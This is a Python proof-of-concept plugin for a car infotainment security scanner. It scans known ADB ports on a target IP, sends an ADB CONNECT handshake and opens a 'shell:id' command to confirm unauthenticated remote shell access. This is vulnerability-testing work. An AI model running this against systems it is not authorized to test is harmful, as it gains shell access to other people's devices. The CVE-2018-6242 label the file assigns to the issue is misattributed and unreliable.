"""
PoC Name: ADB Debug Port Detection
CVE: CVE-2018-6242
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.8
Description: 扫描所有已知 ADB TCP 端口（5555/5556/5558/9527/6789/4444/7777/8888/9999/2233/4567/5037/1234）并尝试 ADB CNXN 握手，检测未授权远程 Shell 访问（含工程模式端口）
Prerequisites: 目标 IVI 运行 Android/HarmonyOS 系统，且 ADB over TCP 已启用。
Usage: python3 09_ADB_Debug_Port.py <target_ip>
"""
import socket
import struct
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

# ADB CNXN 握手包（CONNECT 命令，Android ADB 协议 v1）
ADB_CNXN_PACKET = (
    b"CNXN"               # Command: CONNECT
    b"\x00\x00\x00\x01"  # Version: 0x01000000
    b"\x00\x10\x00\x00"  # Max data: 4096
    b"\x07\x00\x00\x00"  # Data length: 7
    b"\x32\x02\x00\x00"  # Data check
    b"\xbc\xb1\xa7\xb1"  # Magic
    b"host::\x00"         # System identity string
)

# 所有待检测的 ADB 端口（覆盖标准及已知非标准端口）
ADB_PORTS = [
    (5555, "标准 ADB over TCP"),
    (5556, "多设备顺延-2"),
    (5558, "多设备顺延-3"),
    (9527, "工程模式 (AION/国产 IVI)"),
    (6789, "HarmonyOS/鸿蒙车机"),
    (4444, "旧版 ADB server"),
    (7777, "MTK/高通车机测试"),
    (8888, "第三方工具监听"),
    (9999, "第三方工具监听"),
    (2233, "OEM 私有工程端口"),
    (4567, "OEM 私有工程端口"),
    (5037, "ADB server 本地通信"),
    (1234, "root 工具绑定"),
]


class ADBDebugPortPlugin(IVIVulnerabilityPlugin):
    """
    扫描目标所有已知 ADB TCP 端口，尝试 ADB CNXN 握手，
    确认是否存在未授权远程 Shell 访问。
    """
    meta_poc_name = "ADB Debug Port Detection"
    meta_cve_id = "CVE-2018-6242"
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["android", "harmonyos"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标 IP 地址。")
        self.expected_usb_serial = self.params.get("expected_usb_serial")
        return True

    def _adb_checksum(self, payload):
        return sum(payload) & 0xFFFFFFFF

    def _adb_packet(self, command, arg0=0, arg1=0, payload=b""):
        if isinstance(command, str):
            command = command.encode("ascii")
        cmd_int = struct.unpack("<I", command)[0]
        payload = payload or b""
        header = struct.pack(
            "<6I",
            cmd_int,
            arg0,
            arg1,
            len(payload),
            self._adb_checksum(payload),
            cmd_int ^ 0xFFFFFFFF,
        )
        return header + payload

    def _recv_exact(self, sock, size):
        chunks = []
        remaining = size
        while remaining > 0:
            chunk = sock.recv(remaining)
            if not chunk:
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        return b"".join(chunks)

    def _recv_adb_packet(self, sock):
        try:
            header = self._recv_exact(sock, 24)
            if len(header) < 24:
                return None, b""
            cmd_int, arg0, arg1, length, checksum, magic = struct.unpack("<6I", header)
            command = struct.pack("<I", cmd_int)
            payload = self._recv_exact(sock, length) if length else b""
            return {
                "command": command,
                "arg0": arg0,
                "arg1": arg1,
                "length": length,
                "checksum": checksum,
                "magic": magic,
            }, payload
        except Exception:
            return None, b""

    def _try_shell_open(self, sock, remote_id):
        local_id = 1
        sock.sendall(self._adb_packet(b"OPEN", local_id, remote_id, b"shell:id\x00"))
        packet, payload = self._recv_adb_packet(sock)
        if not packet:
            return False, b""
        return packet["command"] in {b"OKAY", b"WRTE"}, payload

    def _check_adb_port(self, port, port_desc, timeout=4):
        """
        返回 dict:
        {
          open: bool,
          command: bytes,
          unauthorized_shell: bool,
          detail: bytes
        }
        """
        result = {"open": False, "command": b"", "unauthorized_shell": False, "detail": b""}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((self.target_ip, port)) != 0:
                s.close()
                return result

            result["open"] = True
            s.sendall(ADB_CNXN_PACKET)
            packet, payload = self._recv_adb_packet(s)
            if not packet:
                result["detail"] = b""
                s.close()
                return result

            result["command"] = packet["command"]
            result["detail"] = payload[:128]
            if packet["command"] == b"CNXN":
                shell_ok, shell_payload = self._try_shell_open(s, packet["arg0"])
                result["unauthorized_shell"] = shell_ok
                if shell_payload:
                    result["detail"] = shell_payload[:128]
            s.close()
            return result
        except Exception:
            return result

    def exploit(self):
        host = self.target_ip
        
        # 1. 优先检测有线 / 本地相连的物理 ADB 设备 (USB)
        try:
            import subprocess
            adb_result = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=5)
            if adb_result.returncode == 0:
                lines = adb_result.stdout.strip().split('\n')
                wired_devices = []
                for line in lines[1:]:  # Skip "List of devices attached"
                    line = line.strip()
                    if line and not line.startswith('*'):  # filter daemon logs
                        parts = line.split()
                        if len(parts) >= 2:
                            dev_id, status = parts[0], parts[1]
                            # 过滤掉模拟器和网络端点，只将其视为有线物理 USB 设备
                            if ":" not in dev_id and "emulator" not in dev_id:
                                wired_devices.append((dev_id, status))
                
                if wired_devices and self.expected_usb_serial:
                    matched_devices = [d for d in wired_devices if d[0] == self.expected_usb_serial]
                    if matched_devices:
                        self.logger.warning(f"  [!!!] 发现目标指定的物理 USB ADB 设备: {matched_devices}")
                        self.results["vulnerable"] = True
                        details = "\n".join(f"  直连设备标示: {d[0]}, 授权状态: {d[1]}" for d in matched_devices)
                        self.results["evidence"] = f"检测到目标指定的有线 USB ADB 调试口:\n{details}"
                        return self.results
                elif wired_devices:
                    self.logger.info("  [*] 本机存在其他 USB ADB 设备，但未提供 expected_usb_serial，避免误报，不据此下结论。")
                else:
                    self.logger.info("  [-] 当前系统未检出直连的有线 ADB 设备。下放至网络端口扫描...")
        except FileNotFoundError:
            self.logger.debug("  [*] 扫描端未安装 `adb` 命令行工具，主动跳过有线 USB 接口检测。")
        except Exception as e:
            self.logger.debug(f"  [*] 尝试检测有线 ADB 状态时发生错误: {e}")

        # 2. 回退到基于 IP 的原生网络 TCP 扫描
        self.logger.info(
            f"开始网络扫描 {host} 上所有已知 ADB 端口（共 {len(ADB_PORTS)} 个）..."
        )

        open_ports = []
        auth_required_ports = []
        vulnerable_ports = []

        for port, desc in ADB_PORTS:
            self.logger.info(f"  探测 {host}:{port} ({desc})...")
            probe = self._check_adb_port(port, desc)

            if not probe["open"]:
                self.logger.info(f"    [-] 端口关闭")
                continue

            self.logger.info(f"    [+] 端口开放！")
            open_ports.append((port, desc))

            if probe["command"] == b"CNXN" and probe["unauthorized_shell"]:
                self.logger.warning(
                    f"    [!!!] ADB 握手成功且 shell OPEN 被接受 - 端口 {port} ({desc})"
                )
                vulnerable_ports.append((port, desc, probe["detail"][:40]))
            elif probe["command"] == b"AUTH":
                self.logger.info(f"    [*] 目标要求 ADB 认证，未确认未授权访问。")
                auth_required_ports.append((port, desc))
            elif probe["command"] == b"CNXN":
                self.logger.info(f"    [*] 收到 CNXN 但未能确认 shell OPEN，结果保守处理。")
            else:
                banner_preview = repr(probe["detail"][:32]) if probe["detail"] else "(无响应)"
                self.logger.info(
                    f"    [*] 未确认未授权 ADB shell（首包={probe['command']!r}）: {banner_preview}"
                )

        # 判断结果
        if vulnerable_ports:
            self.results["vulnerable"] = True
            details = "\n".join(
                f"  端口 {p} ({d}) - ADB CNXN 接受，banner: {repr(b)}"
                for p, d, b in vulnerable_ports
            )
            self.results["evidence"] = (
                f"发现 {len(vulnerable_ports)} 个未授权 ADB 端口（CVE-2018-6242）：\n"
                f"{details}"
            )
            print(
                f"[!] 【漏洞存在】CVE-2018-6242: 未授权 ADB 访问 - "
                f"漏洞端口: {[p for p,_,_ in vulnerable_ports]}"
            )
        elif auth_required_ports or open_ports:
            self.results["vulnerable"] = False
            evidence_lines = []
            if auth_required_ports:
                evidence_lines.append("以下端口返回 AUTH，说明启用了 ADB 认证：")
                evidence_lines.extend(f"  端口 {p} ({d})" for p, d in auth_required_ports)
            if open_ports:
                evidence_lines.append("其余开放端口未确认可直接获得 shell：")
                evidence_lines.extend(f"  端口 {p} ({d})" for p, d in open_ports if (p, d) not in auth_required_ports)
            self.results["evidence"] = "\n".join(evidence_lines)
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                f"未发现任何已知 ADB 端口开放（共检测 {len(ADB_PORTS)} 个端口）"
            )
            self.logger.info("[-] 目标未开放任何已知 ADB 端口。")

        return self.results



if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 09_ADB_Debug_Port.py <target_ip>")
        sys.exit(1)
    plugin = ADBDebugPortPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
